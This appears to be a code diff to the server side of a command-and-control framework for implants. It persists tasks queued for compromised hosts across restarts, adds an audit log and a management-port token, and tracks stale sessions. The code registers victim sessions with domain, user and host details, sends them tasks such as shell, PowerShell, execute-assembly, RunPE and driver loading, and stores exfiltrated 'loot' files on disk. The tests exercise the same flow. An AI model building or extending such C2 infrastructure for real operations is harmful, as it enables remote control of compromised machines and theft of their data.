@@ -10,7 +10,7 @@ use rand_core::OsRng;
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
 use sha2::{Digest, Sha256};
-use std::collections::HashMap;
+use std::collections::{HashMap, VecDeque};
 use std::net::SocketAddr;
 use std::path::{Path, PathBuf};
 use std::sync::atomic::{AtomicU32, AtomicU64, Ordering};
@@ -18,7 +18,7 @@ use std::sync::{Arc, Mutex as SyncMutex};
 use std::time::{SystemTime, UNIX_EPOCH};
 use tokio::io::{AsyncBufReadExt, AsyncRead, AsyncWrite, AsyncWriteExt, BufReader};
 use tokio::net::{TcpListener, TcpStream};
-use tokio::sync::{mpsc, RwLock};
+use tokio::sync::RwLock;
 use tokio_rustls::rustls::pki_types::{CertificateDer, PrivateKeyDer};
 use tokio_rustls::TlsAcceptor;
 
@@ -29,6 +29,7 @@ const PROFILE_DEFAULT: &str = DEFAULT_PROFILE_PATH;
 const CERT_DEFAULT: &str = "server-cert.pem";
 const TLSKEY_DEFAULT: &str = "server-tls-key.pem";
 const STATE_DEFAULT: &str = "state/sessions.json";
+const AUDIT_DEFAULT: &str = "state/audit.jsonl";
 const CHUNK_SIZE: usize = 60_000;
 const MAX_BODY: usize = 8 * 1024 * 1024;
 /// Provisional handshakes awaiting their REGISTER, kept so the register
@@ -62,8 +63,11 @@ struct LiveSession {
     info: SyncMutex<RegisterInfo>,
     addr: SyncMutex<String>,
     last_seen: AtomicU64,
-    queue: mpsc::UnboundedSender<Message>,
-    queue_rx: SyncMutex<mpsc::UnboundedReceiver<Message>>,
+    /// Tasks and upload chunks awaiting delivery, in order. A plain
+    /// deque, not a channel: the contents persist to disk with the
+    /// session, so tasks queued before a restart are still delivered
+    /// after it.
+    pending: SyncMutex<VecDeque<Message>>,
     results: Arc<RwLock<Vec<StoredResult>>>,
     /// Reassembly buffer for implant→server chunked payloads (loot).
     pending_uploads: SyncMutex<HashMap<u32, Vec<u8>>>,
@@ -104,6 +108,15 @@ struct AppState {
     signing_key: SigningKey,
     /// Persistence file; `None` disables saving.
     state_path: Option<PathBuf>,
+    /// Audit log (JSON lines of operator actions and deliveries);
+    /// `None` disables.
+    audit_path: SyncMutex<Option<PathBuf>>,
+    /// Shared secret guarding the mgmt port; `None` accepts any client
+    /// (lab/dev default).
+    mgmt_token: Option<String>,
+    /// A session whose last_seen age exceeds this is reported stale by
+    /// list_sessions (10x profile sleep, clamped).
+    stale_after_secs: u64,
 }
 
 fn now() -> u64 {
@@ -111,6 +124,35 @@ fn now() -> u64 {
         .duration_since(UNIX_EPOCH)
         .map(|d| d.as_secs())
         .unwrap_or(0)
+}
+
+/// Appends one JSON line to the audit log — the after-action record of
+/// what the operator asked for and what the implants did. Best-effort
+/// by design: a log failure must never take down serving (it mirrors
+/// the persistence posture). A single small append; sync std IO.
+fn audit(state: &AppState, event: &str, fields: Value) {
+    let path = state.audit_path.lock().unwrap().clone();
+    let Some(path) = path else {
+        return;
+    };
+    let mut line = serde_json::Map::new();
+    line.insert("ts".into(), json!(now()));
+    line.insert("event".into(), json!(event));
+    if let Some(map) = fields.as_object() {
+        for (key, value) in map {
+            line.insert(key.clone(), value.clone());
+        }
+    }
+    let body = serde_json::to_string(&Value::Object(line)).unwrap_or_default();
+    use std::io::Write;
+    if let Err(e) = std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(&path)
+        .and_then(|mut file| writeln!(file, "{body}"))
+    {
+        eprintln!("[!] audit {}: {e}", path.display());
+    }
 }
 
 fn arg_or(flag: &str, default: &str) -> String {
@@ -216,6 +258,28 @@ async fn main() -> anyhow::Result<()> {
         Some(PathBuf::from(&state_arg))
     };
 
+    // Mgmt auth: when --mgmt-token is set, every mgmt client must open
+    // with {"auth": "<token>"} before any command. The deploy writes
+    // the generated token next to the runtime state (0600).
+    let mgmt_token_arg = arg_or("--mgmt-token", "");
+    let mgmt_token = (!mgmt_token_arg.is_empty()).then_some(mgmt_token_arg);
+    if mgmt_token.is_some() {
+        println!("[*] mgmt auth: token required");
+    } else {
+        println!("[*] mgmt auth: open (no --mgmt-token)");
+    }
+
+    // Audit log of operator actions and deliveries; empty disables.
+    let audit_arg = arg_or("--audit", AUDIT_DEFAULT);
+    let audit_path = if audit_arg.is_empty() {
+        None
+    } else {
+        Some(PathBuf::from(&audit_arg))
+    };
+    if let Some(path) = &audit_path {
+        println!("[*] audit log: {}", path.display());
+    }
+
     let (certs, key) = load_tls_pair(&cert_path, &tlskey_path)?;
     let pin = Sha256::digest(certs[0].as_ref());
     println!("[*] tls cert sha256: {}", hex::encode(pin));
@@ -232,6 +296,9 @@ async fn main() -> anyhow::Result<()> {
         next_task_id: AtomicU32::new(1),
         signing_key,
         state_path,
+        audit_path: SyncMutex::new(audit_path),
+        mgmt_token,
+        stale_after_secs: (profile.sleep_secs.saturating_mul(10)).clamp(120, 86_400),
     });
     if let Some(path) = &state.state_path {
         match load_state(&state, path).await {
@@ -482,18 +549,21 @@ async fn register<S: AsyncWrite + Unpin>(
         *live.addr.lock().unwrap() = peer.to_string();
         live.set_seen();
         println!("[~] session {} resumed from {peer}", live.id);
+        audit(
+            state,
+            "session_resume",
+            json!({ "session": live.id, "addr": peer.to_string() }),
+        );
         live
     } else {
         let session_id = state.next_session_id.fetch_add(1, Ordering::SeqCst);
-        let (tx, rx) = mpsc::unbounded_channel::<Message>();
         let live = Arc::new(LiveSession {
             id: session_id,
             crypto: SyncMutex::new(Some(session)),
             info: SyncMutex::new(info.clone()),
             addr: SyncMutex::new(peer.to_string()),
             last_seen: AtomicU64::new(now()),
-            queue: tx,
-            queue_rx: SyncMutex::new(rx),
+            pending: SyncMutex::new(VecDeque::new()),
             results: Arc::new(RwLock::new(Vec::<StoredResult>::new())),
             pending_uploads: SyncMutex::new(HashMap::new()),
         });
@@ -512,6 +582,18 @@ async fn register<S: AsyncWrite + Unpin>(
         println!(
             "[+] session {session_id}: {}\\{}@{} from {} (implant {})",
             info.domain, info.username, info.hostname, peer, info.implant_version
+        );
+        audit(
+            state,
+            "session_new",
+            json!({
+                "session": session_id,
+                "user": format!("{}\\{}", info.domain, info.username),
+                "hostname": info.hostname,
+                "pid": info.pid,
+                "implant": info.implant_version,
+                "addr": peer.to_string(),
+            }),
         );
         live
     };
@@ -556,23 +638,43 @@ async fn serve_session<S: AsyncWrite + Unpin>(
             }
             msg::TASK_POLL => {
                 live.set_seen();
-                let outbound: Vec<Message> = {
-                    let mut rx = live.queue_rx.lock().unwrap();
-                    let mut drained = Vec::new();
-                    while let Ok(message) = rx.try_recv() {
-                        drained.push(message);
+                let outbound: Vec<Message> =
+                    std::mem::take(&mut *live.pending.lock().unwrap()).into();
+                for message in &outbound {
+                    if let Message::Task(task) = message {
+                        audit(
+                            state,
+                            "task_delivered",
+                            json!({
+                                "session": live.id,
+                                "task_id": task.id,
+                                "kind": task_kind_name(&task.body),
+                            }),
+                        );
                     }
-                    drained
-                };
-                for message in outbound {
-                    let (mt, body) = message.encode();
-                    response.extend_from_slice(&live.seal(mt, &body)?);
+                }
+                if !outbound.is_empty() {
+                    // Delivered messages leave the persisted queue: save.
+                    dirty = true;
+                    for message in outbound {
+                        let (mt, body) = message.encode();
+                        response.extend_from_slice(&live.seal(mt, &body)?);
+                    }
                 }
                 let (mt, body) = Message::BatchEnd.encode();
                 response.extend_from_slice(&live.seal(mt, &body)?);
             }
             msg::RESULT => {
                 if let Message::TaskResult(result) = Message::decode(msg_type, &payload)? {
+                    audit(
+                        state,
+                        "task_result",
+                        json!({
+                            "session": live.id,
+                            "task_id": result.id,
+                            "status": result.status,
+                        }),
+                    );
                     store_task_result(&live.results, result).await;
                     dirty = true;
                 }
@@ -593,7 +695,7 @@ async fn serve_session<S: AsyncWrite + Unpin>(
                     };
                     if let Some(data) = completed {
                         let (mt, body) =
-                            write_loot(live.id, chunk.task_id, data, &live.results).await?;
+                            write_loot(state, live.id, chunk.task_id, data, &live.results).await?;
                         response.extend_from_slice(&live.seal(mt, &body)?);
                         dirty = true;
                     }
@@ -642,6 +744,7 @@ async fn store_task_result(results: &Arc<RwLock<Vec<StoredResult>>>, result: Tas
 /// Writes a completed chunked payload as loot and returns the ack frame
 /// body for the response.
 async fn write_loot(
+    state: &Arc<AppState>,
     session_id: u32,
     task_id: u32,
     data: Vec<u8>,
@@ -651,6 +754,16 @@ async fn write_loot(
     tokio::fs::create_dir_all(&dir).await?;
     let path = dir.join(format!("task-{task_id}.bin"));
     tokio::fs::write(&path, &data).await?;
+    audit(
+        state,
+        "download_loot",
+        json!({
+            "session": session_id,
+            "task_id": task_id,
+            "bytes": data.len(),
+            "path": path.to_string_lossy(),
+        }),
+    );
     results.write().await.push(StoredResult {
         task_id,
         kind: "download".into(),
@@ -681,6 +794,15 @@ struct PersistedInfo {
     implant_version: String,
 }
 
+/// One queued message stored as its WIRE ENCODING: decode is shared
+/// with the live path, so every task kind persists without a mirror
+/// enum to maintain. Body is hex — JSON has no binary.
+#[derive(Serialize, Deserialize)]
+struct PersistedFrame {
+    msg_type: u8,
+    body: String,
+}
+
 #[derive(Serialize, Deserialize)]
 struct PersistedSession {
     id: u32,
@@ -688,6 +810,9 @@ struct PersistedSession {
     addr: String,
     last_seen: u64,
     results: Vec<StoredResult>,
+    /// Messages queued but not yet delivered when the server stopped.
+    #[serde(default)]
+    pending: Vec<PersistedFrame>,
 }
 
 #[derive(Serialize, Deserialize)]
@@ -698,12 +823,10 @@ struct PersistedState {
 }
 
 /// Snapshots the session registry (ids, tokens, identity, result
-/// history, counters) so a restart — a redeploy — keeps the sessions and
-/// beacons RESUME into them on the next re-register. Queued tasks ride
-/// in the in-memory channel: they deliver after a resume within one
-/// server lifetime; a restart loses whatever was still undelivered.
-/// Failures log and continue: persistence is an operational nicety, not
-/// a correctness gate.
+/// history, QUEUED TASKS, counters) so a restart — a redeploy — keeps
+/// the sessions and beacons RESUME into them on the next re-register,
+/// draining whatever was still queued. Failures log and continue:
+/// persistence is an operational nicety, not a correctness gate.
 async fn persist_state(state: &Arc<AppState>) {
     let Some(path) = state.state_path.clone() else {
         return;
@@ -735,12 +858,26 @@ async fn persist_state(state: &Arc<AppState>) {
             if results.len() > PERSIST_RESULT_CAP {
                 results.drain(..results.len() - PERSIST_RESULT_CAP);
             }
+            let pending = live
+                .pending
+                .lock()
+                .unwrap()
+                .iter()
+                .map(|message| {
+                    let (mt, body) = message.encode();
+                    PersistedFrame {
+                        msg_type: mt,
+                        body: hex::encode(body),
+                    }
+                })
+                .collect();
             sessions.push(PersistedSession {
                 id: live.id,
                 info,
                 addr,
                 last_seen: live.last_seen.load(Ordering::SeqCst),
                 results,
+                pending,
             });
         }
     }
@@ -778,10 +915,27 @@ async fn load_state(state: &Arc<AppState>, path: &Path) -> anyhow::Result<usize>
     let mut max_id = 0u32;
     let mut max_task = 0u32;
     for persisted in parsed.sessions {
-        let (tx, rx) = mpsc::unbounded_channel::<Message>();
         max_id = max_id.max(persisted.id);
         for result in &persisted.results {
             max_task = max_task.max(result.task_id);
+        }
+        let mut pending_queue = VecDeque::new();
+        for frame in &persisted.pending {
+            match hex::decode(&frame.body)
+                .map_err(|e| e.to_string())
+                .and_then(|body| Message::decode(frame.msg_type, &body).map_err(|e| e.to_string()))
+            {
+                Ok(message) => {
+                    if let Message::Task(task) = &message {
+                        max_task = max_task.max(task.id);
+                    }
+                    pending_queue.push_back(message);
+                }
+                Err(e) => eprintln!(
+                    "[!] state: session {} dropped undecodable pending frame: {e}",
+                    persisted.id
+                ),
+            }
         }
         let info = RegisterInfo {
             session_token: persisted.info.token,
@@ -803,8 +957,7 @@ async fn load_state(state: &Arc<AppState>, path: &Path) -> anyhow::Result<usize>
             info: SyncMutex::new(info),
             addr: SyncMutex::new(persisted.addr),
             last_seen: AtomicU64::new(persisted.last_seen),
-            queue: tx,
-            queue_rx: SyncMutex::new(rx),
+            pending: SyncMutex::new(pending_queue),
             results: Arc::new(RwLock::new(persisted.results)),
             pending_uploads: SyncMutex::new(HashMap::new()),
         });
@@ -825,8 +978,28 @@ async fn load_state(state: &Arc<AppState>, path: &Path) -> anyhow::Result<usize>
 
 async fn run_mgmt(stream: TcpStream, state: Arc<AppState>) -> anyhow::Result<()> {
     stream.set_nodelay(true)?;
+    let peer = stream
+        .peer_addr()
+        .map(|p| p.to_string())
+        .unwrap_or_default();
     let (rd, mut wr) = stream.into_split();
     let mut lines = BufReader::new(rd).lines();
+    // Shared-secret gate: when --mgmt-token is set, the first line must
+    // be {"auth": "<token>"} before any command is accepted.
+    if let Some(token) = &state.mgmt_token {
+        let first = lines.next_line().await?.unwrap_or_default();
+        let authorized = serde_json::from_str::<Value>(&first)
+            .ok()
+            .and_then(|v| v.get("auth").and_then(|a| a.as_str()).map(str::to_owned))
+            .is_some_and(|supplied| supplied == *token);
+        if !authorized {
+            audit(&state, "mgmt_denied", json!({ "addr": peer }));
+            wr.write_all(b"{\"error\":\"unauthorized\"}\n").await?;
+            return Ok(());
+        }
+        // Ack so clients can confirm the gate before queueing commands.
+        wr.write_all(b"{\"ok\":true}\n").await?;
+    }
     while let Some(line) = lines.next_line().await? {
         let response = match serde_json::from_str::<Value>(&line) {
             Err(e) => json!({ "error": format!("invalid json: {e}") }),
@@ -1181,19 +1354,48 @@ fn session_id_of(request: &Value) -> Option<u32> {
         .and_then(|v| u32::try_from(v).ok())
 }
 
+fn task_kind_name(body: &TaskBody) -> &'static str {
+    match body {
+        TaskBody::Shell { .. } => "shell",
+        TaskBody::Upload { .. } => "upload",
+        TaskBody::Download { .. } => "download",
+        TaskBody::Sleep { .. } => "sleep",
+        TaskBody::Module { .. } => "module",
+        TaskBody::Driver { .. } => "driver",
+        TaskBody::Execute { .. } => "exec",
+        TaskBody::ExecuteAssembly { .. } => "execasm",
+        TaskBody::PowerShell { .. } => "psrun",
+        TaskBody::RunPe { .. } => "runpe",
+        TaskBody::Exit => "exit",
+    }
+}
+
 async fn queue_task(state: &Arc<AppState>, request: &Value, body: TaskBody) -> Value {
     let Some(session_id) = session_id_of(request) else {
         return json!({ "error": "session is required" });
     };
-    let sessions = state.sessions.read().await;
-    let Some(handle) = sessions.get(&session_id) else {
-        return json!({ "error": "unknown session" });
+    let handle = {
+        let sessions = state.sessions.read().await;
+        let Some(handle) = sessions.get(&session_id) else {
+            return json!({ "error": "unknown session" });
+        };
+        handle.clone()
     };
+    let kind = task_kind_name(&body);
     let task_id = state.next_task_id.fetch_add(1, Ordering::SeqCst);
-    match handle.queue.send(Message::Task(Task { id: task_id, body })) {
-        Ok(()) => json!({ "queued": task_id }),
-        Err(_) => json!({ "error": "session is gone" }),
-    }
+    handle
+        .pending
+        .lock()
+        .unwrap()
+        .push_back(Message::Task(Task { id: task_id, body }));
+    audit(
+        state,
+        "task_queued",
+        json!({ "session": session_id, "task_id": task_id, "kind": kind }),
+    );
+    // Persist the queue so a restart still delivers this task.
+    persist_state(state).await;
+    json!({ "queued": task_id })
 }
 
 async fn queue_upload(
@@ -1205,30 +1407,38 @@ async fn queue_upload(
     let Some(session_id) = session_id_of(request) else {
         return json!({ "error": "session is required" });
     };
-    let sessions = state.sessions.read().await;
-    let Some(handle) = sessions.get(&session_id) else {
-        return json!({ "error": "unknown session" });
+    let handle = {
+        let sessions = state.sessions.read().await;
+        let Some(handle) = sessions.get(&session_id) else {
+            return json!({ "error": "unknown session" });
+        };
+        handle.clone()
     };
     let task_id = state.next_task_id.fetch_add(1, Ordering::SeqCst);
     let task = Message::Task(Task {
         id: task_id,
         body: TaskBody::Upload { path: remote },
     });
-    if handle.queue.send(task).is_err() {
-        return json!({ "error": "session is gone" });
-    }
-    let total = data.len().div_ceil(CHUNK_SIZE).max(1);
-    for (seq, part) in data.chunks(CHUNK_SIZE).enumerate() {
-        let chunk = Message::Chunk(Chunk {
-            task_id,
-            seq: seq as u32,
-            data: part.to_vec(),
-            last: seq + 1 == total,
-        });
-        if handle.queue.send(chunk).is_err() {
-            return json!({ "error": "session is gone" });
+    {
+        let mut pending = handle.pending.lock().unwrap();
+        pending.push_back(task);
+        let total = data.len().div_ceil(CHUNK_SIZE).max(1);
+        for (seq, part) in data.chunks(CHUNK_SIZE).enumerate() {
+            pending.push_back(Message::Chunk(Chunk {
+                task_id,
+                seq: seq as u32,
+                data: part.to_vec(),
+                last: seq + 1 == total,
+            }));
         }
     }
+    audit(
+        state,
+        "task_queued",
+        json!({ "session": session_id, "task_id": task_id, "kind": "upload", "bytes": data.len() }),
+    );
+    // One save for the whole batch, not per chunk.
+    persist_state(state).await;
     json!({ "queued": task_id, "bytes": data.len() })
 }
 
@@ -1241,6 +1451,8 @@ async fn list_sessions(state: &Arc<AppState>) -> Value {
         .map(|id| {
             let h = &sessions[*id];
             let info = h.info.lock().unwrap();
+            let last_seen = h.last_seen.load(Ordering::SeqCst);
+            let age = now().saturating_sub(last_seen);
             json!({
                 "id": id,
                 "user": format!("{}\\{}", info.domain, info.username),
@@ -1249,7 +1461,9 @@ async fn list_sessions(state: &Arc<AppState>) -> Value {
                 "arch": if info.arch == message::ARCH_X64 { "x64" } else { "arm64" },
                 "integrity_level": info.integrity_level,
                 "addr": h.addr.lock().unwrap().as_str(),
-                "last_seen": h.last_seen.load(Ordering::SeqCst),
+                "last_seen": last_seen,
+                "age": age,
+                "stale": age > state.stale_after_secs,
                 "implant_version": info.implant_version.as_str(),
             })
         })
@@ -1288,9 +1502,9 @@ async fn list_results(state: &Arc<AppState>, request: &Value) -> Value {
 mod tests {
     use super::*;
     use abraham_common::http::{read_response, write_request};
-    use tokio::io::DuplexStream;
+    use tokio::io::{AsyncReadExt, DuplexStream};
 
-    fn test_state(path: Option<PathBuf>) -> Arc<AppState> {
+    fn test_state(path: Option<PathBuf>, mgmt_token: Option<String>) -> Arc<AppState> {
         Arc::new(AppState {
             sessions: RwLock::new(HashMap::new()),
             tokens: RwLock::new(HashMap::new()),
@@ -1299,6 +1513,9 @@ mod tests {
             next_task_id: AtomicU32::new(1),
             signing_key: SigningKey::generate(&mut OsRng),
             state_path: path,
+            audit_path: SyncMutex::new(None),
+            mgmt_token,
+            stale_after_secs: 120,
         })
     }
 
@@ -1420,7 +1637,7 @@ mod tests {
     #[tokio::test]
     async fn pooled_conn_routes_by_session_header() {
         let (mut client, server_end) = tokio::io::duplex(64 * 1024);
-        let state = test_state(None);
+        let state = test_state(None, None);
         let profile = Profile::default();
         spawn_server(server_end, state.clone(), profile.clone());
 
@@ -1433,15 +1650,16 @@ mod tests {
             state.sessions.read().await.get(&id).unwrap().clone()
         };
         live_a
-            .queue
-            .send(Message::Task(Task {
+            .pending
+            .lock()
+            .unwrap()
+            .push_back(Message::Task(Task {
                 id: 77,
                 body: TaskBody::Sleep {
                     secs: 1,
                     jitter: 0.0,
                 },
-            }))
-            .unwrap();
+            }));
 
         assert!(contains_task(
             &poll(&mut client, &profile, &mut a, 1111).await,
@@ -1484,7 +1702,7 @@ mod tests {
         let path = dir.join("sessions.json");
 
         let (mut client, server_end) = tokio::io::duplex(64 * 1024);
-        let state = test_state(Some(path.clone()));
+        let state = test_state(Some(path.clone()), None);
         let profile = Profile::default();
         let server = spawn_server(server_end, state.clone(), profile.clone());
         let mut a = link(&mut client, &state, &profile, 4242).await;
@@ -1493,21 +1711,19 @@ mod tests {
         let _ = server.await;
 
         // Restart: fresh process state, same file.
-        let state2 = test_state(Some(path.clone()));
+        let state2 = test_state(Some(path.clone()), None);
         assert_eq!(load_state(&state2, &path).await.unwrap(), 1);
         assert_eq!(*state2.tokens.read().await.get(&4242).unwrap(), 1);
 
         // Task queued while the beacon has no transport.
         let live = state2.sessions.read().await.get(&1).unwrap().clone();
-        live.queue
-            .send(Message::Task(Task {
-                id: 901,
-                body: TaskBody::Sleep {
-                    secs: 1,
-                    jitter: 0.0,
-                },
-            }))
-            .unwrap();
+        live.pending.lock().unwrap().push_back(Message::Task(Task {
+            id: 901,
+            body: TaskBody::Sleep {
+                secs: 1,
+                jitter: 0.0,
+            },
+        }));
 
         // Re-link with the SAME token: resumes into session 1 and the
         // offline-queued task drains.
@@ -1523,5 +1739,144 @@ mod tests {
         let _ = server2.await;
 
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// Tasks queued BEFORE the restart persist and still deliver after
+    /// it — the queue rides in state/sessions.json, not memory.
+    #[tokio::test]
+    async fn queued_tasks_survive_restart() {
+        let dir = std::env::temp_dir().join(format!("abraham-pending-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        let path = dir.join("sessions.json");
+
+        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
+        let state = test_state(Some(path.clone()), None);
+        let profile = Profile::default();
+        let server = spawn_server(server_end, state.clone(), profile.clone());
+        let mut a = link(&mut client, &state, &profile, 5151).await;
+        let _ = poll(&mut client, &profile, &mut a, 5151).await;
+
+        // Queue WITHOUT polling it out, then persist (queue_task would
+        // persist; here we drive the queue directly like the tests do).
+        let live = {
+            let id = *state.tokens.read().await.get(&5151).unwrap();
+            state.sessions.read().await.get(&id).unwrap().clone()
+        };
+        live.pending.lock().unwrap().push_back(Message::Task(Task {
+            id: 808,
+            body: TaskBody::Sleep {
+                secs: 1,
+                jitter: 0.0,
+            },
+        }));
+        persist_state(&state).await;
+        drop(client);
+        let _ = server.await;
+
+        // Restart: the undelivered task reloads with the session.
+        let state2 = test_state(Some(path.clone()), None);
+        assert_eq!(load_state(&state2, &path).await.unwrap(), 1);
+        let (mut client2, server_end2) = tokio::io::duplex(64 * 1024);
+        let server2 = spawn_server(server_end2, state2.clone(), profile.clone());
+        let mut a2 = link(&mut client2, &state2, &profile, 5151).await;
+        assert!(contains_task(
+            &poll(&mut client2, &profile, &mut a2, 5151).await,
+            808
+        ));
+        drop(client2);
+        let _ = server2.await;
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// The audit log records the session lifecycle: new session, task
+    /// queued, task delivered.
+    #[tokio::test]
+    async fn audit_log_records_lifecycle() {
+        let dir = std::env::temp_dir().join(format!("abraham-audit-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        let audit_path = dir.join("audit.jsonl");
+
+        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
+        let state = test_state(None, None);
+        *state.audit_path.lock().unwrap() = Some(audit_path.clone());
+        let profile = Profile::default();
+        let server = spawn_server(server_end, state.clone(), profile.clone());
+        let mut a = link(&mut client, &state, &profile, 6161).await;
+
+        let queued = queue_task(
+            &state,
+            &json!({ "session": 1 }),
+            TaskBody::Sleep {
+                secs: 1,
+                jitter: 0.0,
+            },
+        )
+        .await;
+        assert_eq!(queued["queued"], 1);
+        assert!(contains_task(
+            &poll(&mut client, &profile, &mut a, 6161).await,
+            1
+        ));
+        drop(client);
+        let _ = server.await;
+
+        let log = std::fs::read_to_string(&audit_path).unwrap();
+        assert!(log.contains("\"event\":\"session_new\""));
+        assert!(log.contains("\"event\":\"task_queued\""));
+        assert!(
+            log.contains("\"event\":\"task_delivered\""),
+            "audit log: {log}"
+        );
+        assert!(log.contains("\"kind\":\"sleep\""));
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// With --mgmt-token set, clients must open with {"auth": ...} or
+    /// be refused; the right token gets through.
+    #[tokio::test]
+    async fn mgmt_requires_auth_when_token_set() {
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let addr = listener.local_addr().unwrap();
+        let state = test_state(None, Some("s3cret".into()));
+        let server = tokio::spawn(async move {
+            loop {
+                let Ok((stream, _)) = listener.accept().await else {
+                    return;
+                };
+                let state = state.clone();
+                tokio::spawn(async move {
+                    let _ = run_mgmt(stream, state).await;
+                });
+            }
+        });
+
+        // Wrong first line: refused and disconnected.
+        let mut bad = tokio::net::TcpStream::connect(addr).await.unwrap();
+        bad.write_all(b"{\"cmd\":\"sessions\"}\n").await.unwrap();
+        let mut buf = vec![0u8; 256];
+        let n = bad.read(&mut buf).await.unwrap();
+        assert!(n > 0, "refused client must get the error line");
+        assert!(std::str::from_utf8(&buf[..n])
+            .unwrap()
+            .contains("unauthorized"));
+        assert_eq!(bad.read(&mut buf).await.unwrap_or(0), 0, "then closed");
+
+        // Right token: ack line, then commands flow — line by line, so
+        // the client never waits on data already delivered.
+        let good = tokio::net::TcpStream::connect(addr).await.unwrap();
+        let (rd, mut wr) = good.into_split();
+        let mut lines = BufReader::new(rd).lines();
+        wr.write_all(b"{\"auth\":\"s3cret\"}\n").await.unwrap();
+        let ack = lines.next_line().await.unwrap().unwrap();
+        assert_eq!(ack, "{\"ok\":true}");
+        wr.write_all(b"{\"cmd\":\"sessions\"}\n").await.unwrap();
+        let sessions = lines.next_line().await.unwrap().unwrap();
+        assert!(sessions.contains("\"sessions\""), "got: {sessions}");
+
+        server.abort();
     }
 }
